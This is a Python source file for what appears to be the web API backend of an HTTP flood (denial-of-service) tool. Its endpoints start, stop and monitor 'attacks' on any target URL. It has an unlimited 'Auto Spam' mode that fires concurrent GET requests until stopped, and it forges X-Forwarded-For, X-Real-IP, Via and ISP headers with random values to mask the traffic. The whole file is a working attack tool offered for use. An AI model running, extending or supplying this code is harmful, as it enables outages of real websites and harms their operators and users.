from http.server import BaseHTTPRequestHandler
import json
import asyncio
import aiohttp
import random
import time
import uuid
from urllib.parse import parse_qs, urlparse

# Store active attacks (in production, use Redis or database)
active_attacks = {}
attack_logs = {}
attack_stats = {}

class handler(BaseHTTPRequestHandler):
    def do_GET(self):
        parsed = urlparse(self.path)
        query = parse_qs(parsed.query)
        
        if parsed.path == '/api/attack' and 'action' in query:
            action = query['action'][0]
            
            if action == 'stats' and 'id' in query:
                attack_id = query['id'][0]
                
                if attack_id in active_attacks:
                    self.send_response(200)
                    self.send_header('Content-type', 'application/json')
                    self.send_header('Access-Control-Allow-Origin', '*')
                    self.end_headers()
                    
                    # Get recent logs
                    logs = attack_logs.get(attack_id, [])[-50:]  # Last 50 logs
                    
                    response = {
                        'success': True,
                        'stats': attack_stats.get(attack_id, {
                            'total': 0,
                            'success': 0,
                            'failed': 0
                        }),
                        'logs': logs
                    }
                    self.wfile.write(json.dumps(response).encode())
                else:
                    self.send_response(404)
                    self.send_header('Content-type', 'application/json')
                    self.send_header('Access-Control-Allow-Origin', '*')
                    self.end_headers()
                    self.wfile.write(json.dumps({
                        'success': False,
                        'error': 'Attack not found'
                    }).encode())
                return
        
        self.send_response(404)
        self.end_headers()
    
    def do_POST(self):
        if self.path == '/api/attack':
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            data = json.loads(post_data.decode())
            
            action = data.get('action')
            
            if action == 'start':
                # Start new attack
                attack_id = str(uuid.uuid4())[:8]
                
                # Store attack parameters
                active_attacks[attack_id] = {
                    'target': data['target'],
                    'port': data.get('port', ''),
                    'mode': data['mode'],
                    'reqCount': data.get('reqCount'),
                    'concurrency': data['concurrency'],
                    'logging': data['logging'],
                    'start_time': time.time(),
                    'active': True
                }
                
                attack_stats[attack_id] = {
                    'total': 0,
                    'success': 0,
                    'failed': 0
                }
                
                attack_logs[attack_id] = []
                
                # Start attack in background
                asyncio.create_task(run_attack(attack_id, data))
                
                self.send_response(200)
                self.send_header('Content-type', 'application/json')
                self.send_header('Access-Control-Allow-Origin', '*')
                self.end_headers()
                self.wfile.write(json.dumps({
                    'success': True,
                    'attackId': attack_id
                }).encode())
                
            elif action == 'stop':
                attack_id = data.get('id')
                if attack_id in active_attacks:
                    active_attacks[attack_id]['active'] = False
                    
                self.send_response(200)
                self.send_header('Content-type', 'application/json')
                self.send_header('Access-Control-Allow-Origin', '*')
                self.end_headers()
                self.wfile.write(json.dumps({
                    'success': True
                }).encode())
            
            return
        
        self.send_response(404)
        self.end_headers()
    
    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        self.end_headers()

# Attack function
async def run_attack(attack_id, params):
    target = params['target']
    port = params.get('port', '')
    mode = params['mode']
    req_count = params.get('reqCount')
    concurrency = params['concurrency']
    logging_enabled = params['logging'] == 'Y'
    
    # Format URL
    if not target.startswith(('http://', 'https://')):
        target = 'http://' + target
    
    if port:
        if ':' not in target.split('//')[1]:
            parts = target.split('//')
            target = f"{parts[0]}//{parts[1].split('/')[0]}:{port}"
    
    url = target
    
    # Add initial log
    if logging_enabled:
        attack_logs[attack_id].append(f"[SYSTEM] Starting attack on {url}")
    
    # Semaphore for concurrency control
    sem = asyncio.Semaphore(concurrency)
    
    async def send_request(session):
        async with sem:
            if not active_attacks.get(attack_id, {}).get('active', False):
                return
            
            # Generate fake data
            fake_ip = ".".join(str(random.randint(1, 255)) for _ in range(4))
            fake_isp = random.choice([
                "IndiHome", "Telkomsel", "XL Axiata", "3 Indonesia", 
                "Smartfren", "Biznet", "First Media", "MyRepublic"
            ])
            fake_network = random.choice([
                "4G LTE", "5G", "Fiber", "ADSL", "Wi-Fi", "Satellite", "Cable"
            ])
            
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36",
                "Referer": "https://google.com",
                "X-Forwarded-For": fake_ip,
                "Client-IP": fake_ip,
                "X-Real-IP": fake_ip,
                "X-Network-Type": fake_network,
                "X-Network-Carrier": fake_isp,
                "X-ISP-Name": fake_isp,
                "Via": f"{fake_network} {fake_isp}",
                "Forwarded": f"for={fake_ip};by={fake_isp}"
            }
            
            try:
                async with session.get(url, headers=headers, timeout=5) as resp:
                    await resp.read()
                    status = f"Status {resp.status}"
                    
                    # Update stats
                    attack_stats[attack_id]['total'] += 1
                    if 200 <= resp.status < 300:
                        attack_stats[attack_id]['success'] += 1
                    else:
                        attack_stats[attack_id]['failed'] += 1
                    
                    # Add log
                    if logging_enabled:
                        log_msg = f"{url} --> {status} | Fake-IP: {fake_ip} | ISP: {fake_isp} | Net: {fake_network}"
                        attack_logs[attack_id].append(log_msg)
                        
            except Exception as e:
                attack_stats[attack_id]['total'] += 1
                attack_stats[attack_id]['failed'] += 1
                
                if logging_enabled:
                    log_msg = f"{url} --> ERROR: {str(e)[:50]} | Fake-IP: {fake_ip}"
                    attack_logs[attack_id].append(log_msg)
    
    # Run attack
    connector = aiohttp.TCPConnector(limit=None, ssl=False)
    timeout = aiohttp.ClientTimeout(total=10)
    
    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
        tasks = []
        
        if mode == "1":  # Auto Spam
            while active_attacks.get(attack_id, {}).get('active', False):
                task = asyncio.create_task(send_request(session))
                tasks.append(task)
                await asyncio.sleep(0.001)  # Small delay to prevent overwhelming
        else:  # Custom
            for i in range(req_count):
                if not active_attacks.get(attack_id, {}).get('active', False):
                    break
                task = asyncio.create_task(send_request(session))
                tasks.append(task)
            
            if tasks:
                await asyncio.gather(*tasks, return_exceptions=True)
    
    # Cleanup
    if attack_id in active_attacks:
        active_attacks[attack_id]['active'] = False
    
    if logging_enabled:
        attack_logs[attack_id].append(f"[SYSTEM] Attack completed. Total requests: {attack_stats[attack_id]['total']}")
